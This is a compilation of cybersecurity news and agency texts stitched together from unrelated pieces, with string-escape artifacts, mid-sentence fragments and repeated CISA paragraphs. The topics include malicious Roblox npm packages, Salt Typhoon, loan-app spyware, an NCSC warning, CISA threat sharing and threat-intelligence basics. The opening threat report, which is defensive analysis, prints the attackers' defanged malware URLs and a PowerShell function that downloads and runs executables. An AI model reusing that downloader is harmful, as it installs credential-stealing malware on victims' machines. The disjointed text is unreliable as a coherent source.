            "Text: Socket's threat research team has detected five malicious npm packages specifically targeting Roblox users. These packages — node-dlls, ro.dll, autoadv, and two versions of rolimons-api — were designed to impersonate legitimate modules widely used within the Roblox developer community. The threat actor published typosquatted packages to deceive developers into installing Skuld infostealer and Blank Grabber malware. With over 320 downloads before removal, the malicious packages posed significant risks, including the theft of credentials, financial information, and personal data. This incident highlights the alarming ease with which threat actors can launch supply chain attacks by exploiting trust and human error within the open source ecosystem, and using readily available commodity malware, public platforms like GitHub for hosting malicious executables, and communication channels like Discord and Telegram for C2 operations to bypass traditional security measures. Roblox, an online platform and game creation system, boasts 79.5 million daily active users (with 58% aged 13 or older) as of the second quarter of 2024 and has a developer community of 2.5 million contributors. The platform’s popularity makes it a lucrative target for threat actors aiming to steal sensitive information or gain unauthorized access to user accounts. This is not the first time Roblox users and developers have been targeted. In early 2024, Socket reported on a similar attack involving a malicious package impersonating the official noblox.js and noblox.js-server packages. The recurring nature of these attacks indicates a persistent threat landscape, with attackers continually seeking to exploit the popularity of the Roblox platform and its developer community's reliance on open source code. The Threat Actor’s Strategy and Attack Mechanism#  The threat actor typosquatted the popular  node-dll  package — downloaded over 35,800 times — by publishing a deceptive variant named  node-dlls . Roblox developers use the legitimate  node-dll  to interact with Windows Dynamic Link Libraries (DLLs) directly from a Node.js environment, enabling advanced integrations and features. Similarly, the rolimons-api@1.1.0 and rolimons-api@1.1.2 packages aimed to mimic Rolimon’s API Module, a tool used by Roblox developers to integrate Rolimon’s data into their applications or games. While there are unofficial wrappers and modules — such as the  rolimons  Python package (downloaded over 17,000 times) and the  Rolimons  Lua module on GitHub — the malicious rolimons-api packages sought to exploit developers’ trust in familiar names. The malicious packages contained obfuscated code that downloaded and executed Skuld infostealer and Blank Grabber malware. Skuld infostealer, written in Go, is designed to extract sensitive data from Windows systems, targeting applications like Discord, Chromium and Firefox-based browsers, and cryptocurrency wallets. It employs techniques to evade debugging, disable antivirus protections, and escalate privileges, allowing it to capture credentials, cookies, and financial information. Blank Grabber is a Python-based malware that steals sensitive information from infected Windows systems. Featuring a user-friendly GUI builder, it allows threat actors to customize the malware’s behavior, such as disabling Windows Defender or bypassing User Account Control (UAC). Blank Grabber is capable of extracting data like Discord tokens, browser passwords, cookies, cryptocurrency wallet details, as well as capture screenshots and webcam images. In the beginning of 2024, Socket identified an uptick in code packages that distributed Blank Grabber.    Skuld infostealer on the left and Blank Grabber malware on the right showing credential-stealing capability  The stolen data is then sent to the threat actor via Discord webhooks or Telegram. The use of Discord and Telegram for C2 communication can complicate detection efforts if these platforms are used by the platform developers for legitimate purposes. The malicious npm packages contained obfuscated JavaScript code designed to download and execute malicious executables from external sources. Socket’s AI scanner flagged all packages as malicious, providing the following context: “The code is highly obfuscated and designed to download and execute files from external sources, posing a significant security risk. The use of exec to run downloaded content is a red flag for potential malicious behavior, indicating malicious intent by executing files without user consent. This level of obfuscation conceals the code’s true functionality, heightening the security risk to users.” Malicious Code Serving as the Backdoor#  The malicious packages contained obfuscated JavaScript code, a common tactic used by threat actors to conceal the true intent of their code and evade detection. The code defined URLs pointing to malicious executables hosted on a GitHub repository controlled by the threat actor. By leveraging GitHub, a trusted platform among developers, the threat actor increased the likelihood of bypassing security filters and deceiving victims.    Currently defunct GitHub repository that was used by the threat actor to host malware  Below are the threat actor’s code snippets, defanged, and with added comments highlighting malicious functionality and intent.  // Defining URLs to download malicious executables from an external repository\n",
            "const urls = [\n",
            "'hxxps://github[.]com/zvydev/code/raw/main/RobloxPlayerLauncher.exe', // Skuld Infostealer\n",
            "'hxxps://github[.]com/zvydev/code/raw/main/cmd.exe' // Blank Grabber malware\n",
            "];  The function downloadAndRun was added to download the malicious executables and run them using PowerShell commands. This two-step process allowed the threat actor to execute arbitrary code on the victim’s machine without raising immediate suspicion.  // Function that downloads malware from external URLs and then executes them - key malicious behavior\n",
            "async function downloadAndRun(url, path) {\n",
            "const downloadCommand = \"powershell -Command \\\"Invoke-WebRequest -Uri '\" + url + \"' -OutFile '\" + path + \"'\\\"\";\n",
            "const executeCommand = \"powershell -Command \\\"Start-Process '\" + path + \"'\\\"\";\n",
            "try {\n",
            "// Execute download command; downloads the file from the URL to a local path\n",
            "await execAsync(downloadCommand);\n",
            "console.log(\"Downloaded \" + path + \" successfully\");\n",
            "// Execute the downloaded file; allows running arbitrary code\n",
            "await execAsync(executeCommand);\n",
            "console.log(\"Executed \" + path + \" successfully\");\n",
            "} catch (error) {\n",
            "console.error(\"Error: \" + error.message); // Error handling hides any potential download or execution issues\n",
            "}\n",
            "}  By executing the downloaded binaries, the threat actor effectively opened a backdoor into the victim’s system. This action enabled the Skuld infostealer and Blank Grabber malware to deploy, initiating the theft of sensitive data, including credentials, financial information, and personal files. Recommendations and Mitigations#  As open source ecosystems grow and more developers rely on shared code, the attack surface expands, with threat actors looking for more opportunities to infiltrate malicious code. This incident emphasizes the need for heightened awareness and robust security practices among developers. Moving forward, we can expect threat actors to continue refining their techniques, using typosquatting and legitimate platforms for malicious purposes to target specific developer communities like Roblox. It is crucial for the developer community and organizations to adopt proactive security measures, stay informed about emerging threats, and foster a culture of vigilance in the software supply chains. Threat actors exploit trust and human error by mimicking trusted packages to introduce malicious code into applications. Vigilance is key: always verify package names carefully, review third-party code, and employ security tools designed to detect potentially malicious packages.  Socket’s free GitHub app serves as a critical line of defense against such threats. It detects malicious packages in real-time, scanning incoming dependencies with every pull request.

            "\"Ultimately, rather than providing genuine financial assistance, these apps can lead users into a cycle of debt and privacy violations,\" Ruiz said.\n",
            "Despite differences in the targeting, the apps have been found to share a common framework to encrypt and exfiltrate data from a victim's device to a command-and-control (C2) server. They also follow a similar user experience and onboarding process to apply for the loan.\n",
            " \n",
            "Furthermore, the apps request for a number of intrusive permissions that allow them to harvest system information, camera, call logs, contact lists, coarse location, and SMS messages.

While T-Mobile isn't pointing fingers directly, cybersecurity experts think they know who's behind it - a hacking group nicknamed 'Salt Typhoon,' which apparently has ties to China. What makes this really interesting is that these hackers have a brand new trick up their sleeve: they're using a previously unknown backdoor tool called GHOSTSPIDER.

While bootkits discovered to date have only targeted Windows machines, the discovery of Bootkitty indicates that it's no longer the case.

Cybersecurity firm Morphisec said it identified five significant NTLM vulnerabilities that could be exploited to leak the credentials via Malicious RTF Document Auto Link in Microsoft Word, Remote Image Tag in Microsoft Outlook, Remote Table Refresh in Microsoft Access, Legacy Player Files in Microsoft Media Player, and Remote Recipient List in Microsoft Publisher. Microsoft has acknowledged these flaws but noted that they are either by design or do not meet the bar for immediate servicing.

            "Text: The UK is underestimating the severity of the online threat it faces from hostile states and criminal gangs, the country’s cybersecurity chief will warn. Richard Horne, the head of GCHQ’s National Cyber Security Centre, will cite a trebling of “severe” incidents amid Russian “aggression and recklessness” and China’s “highly sophisticated” digital operations. In his first major speech as the agency’s chief, Horne will say on Tuesday that hostile activity in UK cyberspace has increased in “frequency, sophistication and intensity” from enemies who want to cause maximum disruption and destruction. In a speech at the NCSC’s London HQ, Horne, who took on the role in October, will point to “the aggression and recklessness of cyber-activity we see coming from Russia” and how “China remains a highly sophisticated cyber-actor, with increasing ambition to project its influence beyond its borders”. “And yet, despite all this, we believe the severity of the risk facing the UK is being widely underestimated,” he will say. One expert described the comments as a “klaxon” call to companies and public sector organisations to wake up to the scale of the cyber-threat facing the UK. Horne will make the warning as the NCSC reveals a significant increase in serious cyberincidents over the past 12 months. Its annual review shows that the agency had responded to 430 incidents requiring its support between 1 September 2023 and 31 August 2024, compared with 371 in the previous 12 months. It says that 12 of those attacks were at the “top end of the scale” and were “more severe in nature” – a trebling from the previous year. “There is no room for complacency about the severity of state-led threats or the volume of the threat posed by cybercriminals,” Horne will say. “The defence and resilience of critical infrastructure, supply chains, the public sector and our wider economy must improve.” Last week the Cabinet Office minister, Pat McFadden, warned that Russia “can turn the lights off for millions of people” with a cyber-attack. The NCSC review does not reveal the split between state-executed attacks and incidents perpetrated by criminal gangs. However, it is understood that a significant amount of its time is spent supporting organisations responding to ransomware attacks, where criminal gangs paralyse their targets’ IT systems and extract confidential data. The gangs then demand a ransom payment in bitcoin to return the stolen data. Recent ransomware attacks against high-profile UK targets include the British Library and Synnovis, which manages blood tests for NHS trusts and GP services. The NCSC says it received 317 reports of ransomware activity last year, of which 13 were “nationally significant”. “The attack against Synnovis showed us how dependent we are on technology for accessing our health services. And the attack against the British Library reminded us that we’re reliant on technology for our access to knowledge,” Horne will say. “What these and other incidents show is how entwined technology is with our lives and that cyber-attacks have human costs.” Ransomware gangs typically originate from Russia or former Soviet Union countries and their presence appears to be tolerated within Russia, provided they do not attack Russian targets. However, one Russian cybercrime gang, Evil Corp, has carried out attacks against Nato countries at the behest of state intelligence services, according to the UK’s National Crime Agency. Horne adds: “What has struck me more forcefully than anything else since taking the helm at the NCSC is the clearly widening gap between the exposure and threat we face, and the defences that are in place to protect us.” “And what is equally clear to me is that we all need to increase the pace we are working at to keep ahead of our adversaries.” It is understood the “underestimated” warning is directed at public and private sector organisations in the UK. The NCSC says the top sectors reporting ransomware activity this year were academia, manufacturing, IT, legal, charities and construction. The agency’s review says that the Russian regime, through its invasion of Ukraine, is inspiring non-state actors to carry out cyber-attacks against critical national infrastructure in the west. The review points to Chinese hackers such as the Volt Typhoon group, which has targeted US infrastructure and “could be laying the groundwork for future disruptive and destructive cyber-attacks” while in the UK Beijing-linked groups have targeted MPs’ emails and the Electoral Commission’s database. The report also warns that Iran “is developing its cyber-capabilities and is willing to target the UK to fulfil its disruptive and destructive objectives” while North Korean hackers were targeting cryptocurrency to raise revenue and attempting to steal defence data to improve Pyongyang’s internal security and military capabilities. The NCSC also believes that UK firms are almost certainly being targeted by workers from North Korea “disguised as freelance third-country IT staff to generate revenue for the DPRK regime”. Alan Woodward, a professor of cybersecurity at Surrey University, said NCSC was warning the private and public sectors not to “take their eye off the ball”. “The government is trying to sound the klaxon,” he said. “The feeling is that not everybody is listening yet.”\n",

            "Text: The cybersecurity landscape in 2024 is poised for significant challenges as attackers grow more sophisticated and exploit vulnerabilities in emerging technologies like AI and cloud computing. Cybercrime damages are expected to reach $10.5 trillion by 2025, highlighting the increasing risks enterprises face. This article explores 16 key cybersecurity challenges and how organizations can build proactive strategies to counter them.\n",
            "Major Cybersecurity Challenges in 2024:\n",
            "   Malware and Ransomware:  \n",
            "Malware and ransomware attacks are among the most pressing challenges. Ransomware attacks have evolved into a $20 billion industry, exploiting zero-day vulnerabilities. Implementing advanced endpoint security solutions is crucial for protection.  \n",
            "   Social Engineering Attacks:  \n",
            "With the rise of cloud services, social engineering attacks like spear phishing and pretexting are more common. These attacks manipulate employees into revealing sensitive information. Enterprises must enforce security protocols, multi-factor authentication, and train employees to recognize these attacks.  \n",
            "   State-Affiliated Cyberattacks:  \n",
            "Cyberattacks linked to state-backed entities, often for political or warfare purposes, are on the rise. Recent attacks have targeted major organizations with ransomware and DDoS attacks, particularly in regions like Ukraine and Israel.  \n",
            "   Data Breaches:  \n",
            "Despite advances in cybersecurity technology, data breaches remain a significant threat. Attackers are finding new ways to exploit vulnerabilities and steal sensitive information. Data breaches can lead to severe fines and litigation, making data protection essential.  \n",
            "   Business Email Compromise (BEC) Scams:  \n",
            "BEC scams are becoming more prevalent, especially with the use of generative AI to craft convincing phishing emails. These scams can lead to significant financial losses as attackers trick employees into making fraudulent payments. Awareness programs and strong email security can reduce this risk.  \n",
            "   Artificial Intelligence (AI):  \n",
            "AI is being used by attackers to enhance and diversify their attacks. Tools like generative AI enable cybercriminals to create sophisticated phishing emails, malware, and deepfakes, making attacks harder to detect. AI can also be used to impersonate individuals or spread misinformation.  \n",
            "   Compromised Credentials and Tokens:  \n",
            "The shift to remote and hybrid work has made tokens and credentials a prime target for attackers. Misconfigured or insecurely stored tokens are often exploited, as seen in breaches like Microsoft’s Azure SAS token issues. Securing these credentials is critical to preventing unauthorized access.  \n",
            "   Mobile Device Risks:  \n",
            "Mobile devices are increasingly vulnerable as employees download malicious apps or compromise security with inadequate mobile device management (MDM). Attackers can exploit MDM vulnerabilities, leading to malware installation or data breaches. Implementing mobile security measures is vital.  \n",
            "   PIP Install Malware:  \n",
            "The use of open-source software introduces risks through insecure libraries and dependencies. Attackers often inject malware into these libraries, exploiting typosquatting or brandjacking. Developers must ensure that third-party libraries are secure and up-to-date.  \n",
            "   Securing Tax and Financial Data:  \n",
            "During tax season, enterprises are particularly vulnerable to attacks targeting financial data. Cybercriminals often use phishing tactics masquerading as tax officials to steal sensitive information. Multi-factor authentication and robust protection measures are essential for safeguarding financial data.  \n",
            "   Internet of Things (IoT) Attacks:  \n",
            "As IoT devices become more widespread, they create significant security risks due to their lack of robust security measures. Attackers exploit vulnerabilities in IoT devices to install malware, move laterally in networks, or cause damage. Securing IoT devices is crucial to preventing these attacks.  \n",
            "   Software and Hardware-Based Supply Chain Attacks:  \n",
            "Supply chain attacks, where attackers target third-party vendors to gain access to an enterprise's system, remain a major threat. Regular updates, patch management, and securing third-party components are key to preventing these attacks.  \n",
            "   Configuration Mistakes:  \n",
            "Misconfigurations in security setups continue to be a vulnerability for many organizations. Using tools like Cloud Security Posture Management (CSPM) can help identify and correct these mistakes before they are exploited by attackers.  \n",
            "   Complexity of Data Privacy Regulations:  \n",
            "As data privacy laws become more complex, enterprises face the challenge of ensuring compliance with evolving regulations. Using compliance management tools can help organizations navigate this complexity and avoid penalties.  \n",
            "   Low Budget for Cybersecurity:  \n",
            "High inflation and economic pressures have led many organizations to reduce their cybersecurity budgets, making it difficult to maintain strong security postures. Security is often seen as an expenditure without immediate ROI, leading to compromised protections.  \n",
            "   Cybersecurity Skill Gap:  \n",
            "The cybersecurity industry continues to face a significant skill shortage. With millions of open positions, organizations struggle to find qualified professionals to manage security. This shortage hampers efforts to improve security and adequately address modern cyber threats.  \n",

            " Ollie Whitehouse, NCSC Chief Technology Officer, said:  \n",
            "“More routine initial exploitation of zero-day vulnerabilities represents the new normal which should concern end-user organisations and vendors alike as malicious actors seek to infiltrate networks. \n",
            "“To reduce the risk of compromise, it is vital all organisations stay on the front foot by applying patches promptly and insisting upon secure-by-design products in the technology marketplace. \n",

In 2023, the majority of the most frequently exploited vulnerabilities were initially exploited as a zero-day, which is an increase from 2022, when less than half of the top exploited vulnerabilities were exploited as a zero-day. Malicious cyber actors continue to have the most success exploiting vulnerabilities within two years after public disclosure of the vulnerability.

            "Text: An estimated 25.5% of the world’s population was impacted by cyber-enabled fraud in 2023. The impact of the profits this generates for criminals goes further than the immediate victims. In 2023, the United Nations reported that at least 220,000 people had been trafficked in South-East Asia, some from as far away as Africa and Latin America, and forced to run online scams. A new white paper from the World Economic Forum,  Disrupting Cybercrime Networks: A Collaboration Framework  explores how to build on the success of existing partnerships to accelerate the disruption of cybercriminal activities. Here we examine some of its learnings and recommendations.  The convergence of cybercrime and violent organized crime has also led to a cultural shift among cybercriminals, with new entrants to the cybercrime market less concerned about causing physical harm at scale. In June 2024, a ransomware attack on a blood test provider prompted the United Kingdom’s National Health Service to urgently call for blood donations and rearrange more than 800 planned operations after it lost the service’s ability to match patients’ blood.  Disrupting cybercriminals at scale  Cybercriminals have increased the volume and impact of their activities by collaborating and mimicking business strategies to make their operations more efficient. Now, it's time for cyber-defenders to join forces and work together to stay ahead in the fight against cybercrime. The World Economic Forum’s Centre for Cybersecurity has released a framework to support operational collaborations that disrupt cybercrime at scale. 2024 has seen a string of successful disruption campaigns targeting cybercrime groups that could be a blueprint for tackling the problem. Law enforcement in Thailand and the Philippines successfully rescued hundreds of people from forced labour in cyber-scam farms and worked with the private sector to recover criminal profits. In West Africa and Latin America, operations supported by INTERPOL have led to coordinated arrests. In Europe and North America, collaborations between industry and law enforcement have led to unprecedented success in the disruption of cybercriminals’ technical infrastructure, creating new levels of risk for cybercrime service providers and the criminals who use them. Cybercriminal groups have evolved into highly lucrative transnational enterprises linked by complicated networks of commercial relationships and supply chains. This allows cybercriminals to operate at scale and creates opportunities to make cybercrime less attractive through disruption and arrest, significantly altering the risk-reward calculus for perpetrators.  Operational collaborations increase the difficulty, costs and risk associated with executing cybercriminal activities. Cross-sector partnerships allow for the pooling of resources, leading to enhanced capabilities that individual organizations might not achieve alone.  Have you read?    These sectors are top targets for cybercrime, and other cybersecurity news to know this month     LockBit: How an international operation seized control of ‘the world’s most harmful cybercrime group’     3 things organizations must do to disrupt cybercrime      Bringing organizations together to scale and accelerate collaborations against cybercrime  The research developed by the World Economic Forum’s Partnership Against Cybercrime highlights three main pillars to build and sustain this type of collaboration: incentives to collaborate, structure, and governance and resources.          Successful operational collaborations to counter cybercrime need a clear mission to keep participants involved and working towards shared goals. Feedback and public recognition are also core to keeping momentum, showing individuals, organizations and stakeholders how their contributions make a difference. Peer-to-peer learning is also a key factor, providing experts with the technical knowledge required to combat cybercrime and build trust and foster long-term, personal collaborations between stakeholders. Additionally, the research shows that successful collaborations incorporate strict governance of data and risk, a sharp focus on measuring impact and considerable flexibility on how exactly experts interact. The art of supporting formal and informal governance structures requires that a collaboration’s leadership and management be sensitive to participating organizations’ risk appetites and each participant’s ability to adapt how they work to the needs of the collaboration. While some parts of governance will be rigid, others will need to have space into which the collaboration can grow. Building a community and shared work culture requires time and incremental development so that the participants have sufficient trust in each other to work effectively.  The dual structure in action  A good example of this dual structure is the Cyber Threat Alliance (CTA). CTA members share timely and actionable information about cyberthreats, allowing them to enhance their products, better protect customers and more effectively disrupt cyberattacks. The CTA uses a platform that allows members to upload and access data about cyber threats in a standardized format. This system organizes information around key patterns and techniques used by attackers, making it easier for members to understand them and act on them. An algorithm scores each submission, rewarding members for sharing valuable and timely intelligence. This scoring creates a healthy sense of competition, further motivating members to improve the quality of their shared intelligence. With over 12 million data points exchanged monthly, this collaboration ensures CTA members have timely information, collectively strengthening global cybersecurity. This dual governance fork can also be seen at work in the  Cybercrime Atlas initiative. Launched in 2023 and hosted at the World Economic Forum Centre for Cybersecurity, the Cybercrime Atlas fosters collaboration among participants who build a shared understanding of cybercriminal networks using open-source intelligence. This information is then used to support community members to create friction across cybercriminal activities and to support action by public-sector agencies.  The starting point for the information is that it is open-source and shareable. Information only becomes sensitive as assessments of criminal activity are built around it. Because the underlying information is not sensitive, the Cybercrime Atlas was in a position to start research while relying on already accepted standards for information classification, such as the Traffic Light Protocol. This enabled a rapid setup of anti-cybercrime activities alongside the development of standard operating procedures by the Cybercrime Atlas expert community. As a result, within just one year of its launch, the Cybercrime Atlas supported two cross-border disruption campaigns in 2024.   Coordinating resources   Finally, effective operational collaboration in the fight against cybercrime requires a well-coordinated deployment of resources. Data feeds create a common language that facilitates clear communication across different organizations and sectors, ensuring that data from various sources is harmonized into comparable formats. Information security protocols safeguard shared intelligence against unauthorized access, breaches and data corruption.  Additionally, the exponential growth of cyberthreat data has placed significant demands on data storage and processing infrastructures. As data streams are continuously generated and shared across collaborative ecosystems, the infrastructure supporting data storage and processing must ensure that insights can be derived quickly and efficiently. Legal protocols formalize relationships between entities, clarifying roles and responsibilities, while ensuring compliance with international privacy standards. These frameworks support the exchange of action\n",

            "Text: Automated Indicator Sharing (AIS), a Cybersecurity and Infrastructure Security Agency (CISA) capability, enables the real-time exchange of machine-readable cyber threat indicators and defensive measures to help protect participants of the AIS community and ultimately reduce the prevalence of cyberattacks. The AIS community includes private sector entities; federal departments and agencies; state, local, tribal, and territorial (SLTT) governments; information sharing and analysis centers (ISACs) and information sharing and analysis organizations (ISAOs); and foreign partners and companies. AIS is offered at no cost to participants as part of CISA’s mission to work with our public and private sector partners to identify and help mitigate cyber threats through information sharing and provide technical assistance, upon request, that helps prevent, detect, and respond to incidents.\n",
            "The AIS ecosystem empowers participants to share cyber threat indicators and defensive measures, such as information about attempted adversary compromises as they are being observed, to help protect other participants of the AIS community and ultimately limit the adversary’s use of an attack method. The more you share, the more everyone becomes informed, and the more we all prevent further damage from vicious cyber-attacks together!\n",
            "How AIS Works\n",
            "AIS uses open standards: the Structured Threat Information Expression (STIX™) for cyber threat indicators and defensive measures information and the Trusted Automated Exchange of Indicator Information (TAXII™) for machine-to-machine communications. Using standards allows threat activity context such as tactics, techniques, and procedures, vulnerabilities, and courses of action to be shared through a communications protocol to and from participants. \n",
            "AIS uses a server/client architecture for communications. AIS participants connect to AIS with a STIX/TAXII client (which can be built or bought from commercial vendors) to exchange cyber threat indicators and defensive measures with CISA and, in turn, other AIS participants via the AIS TAXII Server. CISA respects organizational privacy; AIS anonymizes submissions by default when transmitting them, meaning that the identity of the submitter is not revealed without the prior express consent of the submitter.\n",
            "In the future, CISA intends to provide additional AIS features to allow participants to identify the most operationally relevant indicators. As CISA receives participant feedback, it will continue to perform updates to make AIS as useful and relevant to the community as possible. Please send any feedback to cyberservices@cisa.dhs.gov.\n",

            "Automated Indicator Sharing (AIS), a Cybersecurity and Infrastructure Security Agency (CISA) capability, enables the real-time exchange of machine-readable cyber threat indicators and defensive measures to help protect participants of the AIS community and ultimately reduce the prevalence of cyberattacks. The AIS community includes private sector entities; federal departments and agencies; state, local, tribal, and territorial (SLTT) governments; information sharing and analysis centers (ISACs) and information sharing and analysis organizations (ISAOs); and foreign partners and companies. AIS is offered at no cost to participants as part of CISA’s mission to work with our public and private sector partners to identify and help mitigate cyber threats through information sharing and provide technical assistance, upon request, that helps prevent, detect, and respond to incidents.\n",
            "The AIS ecosystem empowers participants to share cyber threat indicators and defensive measures, such as information about attempted adversary compromises as they are being observed, to help protect other participants of the AIS community and ultimately limit the adversary’s use of an attack method. The more you share, the more everyone becomes informed, and the more we all prevent further damage from vicious cyber-attacks together!\n",
            "How AIS Works\n",
            "AIS uses open standards: the Structured Threat Information Expression (STIX™) for cyber threat indicators and defensive measures information and the Trusted Automated Exchange of Indicator Information (TAXII™) for machine-to-machine communications. Using standards allows threat activity context such as tactics, techniques, and procedures, vulnerabilities, and courses of action to be shared through a communications protocol to and from participants.\n",
            "AIS uses a server/client architecture for communications. AIS participants connect to AIS with a STIX/TAXII client (which can be built or bought from commercial vendors) to exchange cyber threat indicators and defensive measures with CISA and, in turn, other AIS participants via the AIS TAXII Server. CISA respects organizational privacy; AIS anonymizes submissions by default when transmitting them, meaning that the identity of the submitter is not revealed without the prior express consent of the submitter.\n",
            "In the future, CISA intends to provide additional AIS features to allow participants to identify the most operationally relevant indicators. As CISA receives participant feedback, it will continue to perform updates to make AIS as useful and relevant to the community as possible. Please send any feedback to cyberservices@cisa.dhs.gov.\n",

This law grants liability protection, privacy protections, and other protections to organizations that share cyber threat indicators and defensive measures through AIS in accordance with the Act’s requirements. As mandated by CISA 2015, DHS certified the operation of AIS in March 2016 and released guidance, in conjunction with the Department of Justice, to help private sector entities share cyber threat indicators with the Federal Government. This guidance, as well as other guidance published pursuant to the Act, can be found immediately below and can also be found with the rest of the AIS documents in the AIS 2.0 and AIS 1.0 Documents sections.\n",

            "Text: When cyber incidents occur, the Department of Homeland Security (DHS) provides assistance to potentially impacted entities, analyzes the potential impact across critical infrastructure, investigates those responsible in conjunction with law enforcement partners, and coordinates the national response to significant cyber incidents. The Department works in close coordination with other agencies with complementary cyber missions, as well as private sector and other non-federal owners and operators of critical infrastructure, to ensure greater unity of effort and a whole-of-nation response to cyber incidents. CISA Central CISA Central's mission is to reduce the risk of systemic cybersecurity and communications challenges in our role as the Nation's flagship cyber defense, incident response, and operational integration center. Since 2009,CISA Central has served as a national hub for cyber and communications information, technical expertise, and operational integration, and by operating our 24/7 situational awareness, analysis, and incident response center. CISA Central brings advanced network and digital media analysis expertise to bear on malicious activity targeting our nation's networks. CISA Central develops timely and actionable information for distribution to federal departments and agencies, state and local governments, private sector organizations, and international partners. CISA Central also operates the National Cybersecurity Protection System (NCPS), which provides intrusion detection and prevention capabilities to covered federal departments and agencies. CISA Central’s National Coordinating Center for Communications (NCC) leads and coordinates the initiation, restoration, and reconstitution of national security and emergency preparedness telecommunications services and/or facilities under all conditions. NCC leverages partnerships with government, industry and international partners to obtain situational awareness and determine priorities for protection and response. Reporting Cyber Incidents to the Federal Government Cyber Incident Reporting: A Unified Message for Reporting to the Federal Government  Presidential Policy Directive (PPD)/PPD-41, United States Cyber Incident Coordination, outlines the roles federal agencies play during a significant cyber incident. The Department of Homeland Security (DHS) is unique among agencies in that it plays a major role in both asset response and threat response. Asset response focuses on the assets of the victim or potential targets of malicious activity, while threat response includes identifying, pursuing, and disrupting malicious cyber actors and activity. DHS is the lead agency for asset response during a significant cyber incident. The department’s National Cybersecurity and Communications Center (NCCIC) assists asset owners in mitigating vulnerabilities, identifies other entities that may be at risk, and shares information across the public and private sectors to protect against similar incidents in the future. The Department of Justice, through the FBI and the NCIJTF, is the lead agency for threat response during a significant incident, with DHS’s investigative agencies—the Secret Service and ICE/HSI - playing a crucial role in criminal investigations. National Cyber Incident Response Plan (NCIRP) The NCIRP describes a national approach to cyber incidents, delineating the important role that private sector entities, state and local governments, and multiple federal agencies play in responding to incidents and how those activities all fit together. This updated plan applies to cyber incidents and more specifically significant cyber incidents that are likely to result in demonstrable harm to the national security interests, foreign relations, or economy of the United States or to the public confidence, civil liberties, or public health and safety of the American people. The NCIRP reflects and incorporates lessons learned from exercises and cyber incidents, and policy and statutory updates, such as Presidential Policy Directive (PPD) 41 on Cyber Incident Coordination Policy and the National Cybersecurity Protection Act of 2014. The NCIRP leverages principles from the National Preparedness System and was developed in coordination with the Departments of Justice and Defense, the Sector Specific Agencies and other interagency partners, representatives from across 16 critical infrastructure sectors, the private sector, and state and local governments. To learn more about the NCIRP, please visit the NCIRP page. Incident Response Training To support the capacity of our nation’s cyber enterprise, CISA has developed no-cost cybersecurity incident response (IR) training for government employees and contractors across Federal, State, Local, Tribal, and Territorial government, and is open to educational and critical infrastructure partners. The incident response curriculum provides a range of training offerings for beginner and intermediate cyber professionals encompassing basic cybersecurity awareness and best practices for organizations and hands-on cyber range training courses for incident response. Course types include: Awareness Webinars and Cyber Range Training. These courses provide valuable learning opportunities for everyone from cyber newbies to veteran cybersecurity engineers.  To learn more about CISA's incident response training, please visit the Incident Response Training page.\n",

Threat intelligence newsletter         What is cyber threat intelligence (CTI)?    CTI is a refined insight into cyber threats. Intelligence teams use credible insights from multiple sources to create actionable context on the threat landscape, threat actors and their tactics, techniques, and procedures (TTPs). The effective use of CTI allows organizations to make the shift from being reactive to becoming more proactive against threat actors.      How can CTI be used to make security more proactive?    Credible threat intelligence can be used to understand the malware and TTPs threat actors use and the vulnerabilities they exploit to target specific industries and regions. Organizations use this intelligence to implement, configure, and adjust security tools, and train staff to thwart attacks.      What is a threat actor?    A threat actor is a person or group of people who conduct malicious targeting or attacks on others. Typically motivated by espionage, financial gain, or publicity, threat actors may conduct a full campaign alone or work with other groups who specialize in specific aspects of an attack.      How can you identify active threats?    Assuming we all agree that a “threat” is defined as a plan or inclination to attack as opposed to an “attack” which is an existing or previously successful breach. Identifying active threats can be done using threat intelligence which will help provide context into the threat actors and malware impacting your specific region or industry. Another method to identify active threats is by scanning the open, deep, and dark web for chatter around your organization, personnel, technology, or partners. By identifying these threats, security professionals can proactively adjust their defenses to block or reduce the impact of a potential attack.      What are the three types of CTI?    Strategic – High level trends used to drive business decisions and security investments. Operational – Contextual information on impending threats to the organization, used by security professionals to understand more about threat actors and their TTPs. Tactical – Understanding of the threat actor TTPs, used by security professionals to stop incidents and make defensive adjustments.     ||||I|||| Page Contents\n",

Typically motivated by espionage, financial gain, or publicity, threat actors may conduct a full campaign alone or work with other groups who specialize in specific aspects of an attack. How can you identify active threats? Assuming we all agree that a “threat” is defined as a plan or inclination to attack as opposed to an “attack” which is an existing or previously successful breach. Identifying active threats can be done using threat intelligence which will help provide context into the threat actors and malware impacting your specific region or industry.']\n",

            "The Multi-State and Elections Infrastructure Information Sharing &amp; Analysis Centers' (MS- and EI-ISAC) Cyber Threat Intelligence (CTI) team plays a key role in supporting U.S. State, Local, Tribal, and Territorial (SLTT) government entities’ cybersecurity defenses. But what do we mean when we say \"CTI,\" and what is its function?\n",
            "At the MS- and EI-ISACs, we’re driven by our mission to provide cybersecurity support for our nation’s SLTTs. This includes offering access to a 24x7x365 Security Operations Center (SOC) and other supporting teams, such as the Cyber Incident Response Team (CIRT). These teams work in tandem to provide real-time and tailored cybersecurity support and recommendations for SLTTs.\n",
            "CTI performs a critical function among these teams by ensuring that their actions are informed by timely and actionable threat intelligence. Threat intelligence is knowledge about adversaries and their motivations, intentions, and methods that is collected, analyzed, and disseminated in ways that help security and business staff at all levels protect critical assets of the enterprise. When we say “CTI,” we’re referring to a collaborative initiative driven by the CTI team focused on maintaining timely situational awareness of the threat environment to inform SLTT cybersecurity decision-makers.\n",
            "To better highlight how this works, we will explain how our analysis fits into the classic intelligence cycle and provide an example of CTI in action that exemplifies how we think about and deliver threat intelligence.\n",
            "The Intel Cycle\n",
            "The MS- and EI-ISAC CTI team relies upon the classic intelligence cycle (steps listed below) to drive our operations, but we tailor it to our specific mission requirements. The steps in the intel cycle include:\n",
            "Planning\n",
            "Collection\n",
            "Processing\n",
            "Analysis\n",
            "Dissemination\n",
            "One visible shift in our application of the intel cycle (See Figure 1 below.) is that the steps are recursive. This means we’re often not following the steps straight through but may instead jump around. For example, Processing (3) may lead us back to review our Collections (2). Similarly, feedback from SLTT representatives during the Dissemination process (5) may lead us to revise our Planning (1).\n",
            " \n",
            "Figure 1: The MS-ISAC CTI team’s tailored intel cycle\n",
            "Planning – Key Intel Questions &amp; Priority Intelligence Requirements (PIRs)\n",
